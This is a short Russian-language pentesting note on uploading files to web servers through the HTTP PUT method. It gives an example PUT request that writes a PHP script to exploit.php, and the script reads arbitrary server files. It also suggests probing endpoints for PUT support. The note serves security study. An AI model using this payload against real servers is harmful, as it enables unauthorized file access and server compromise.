## Оглавление


---


> [!info] Общее
> Некоторые серверы могут быть настроены на поддержку запросов PUT, если не установлена соответствующая защита, это может стать альтернативным способом загрузки вредоносных файлов даже если функция загрузки недоступна через веб интерфейс
> 

Пример
```
PUT /images/exploit.php HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-httpd-php
Content-Length: 49

<?php echo file_get_contents('/path/to/file'); ?>
```

> [!warning] ВАЖНО
> Можно попробовать отправить запросы на разные endpoints чтобы протестировать их на наличие сообщений о поддержке PUT
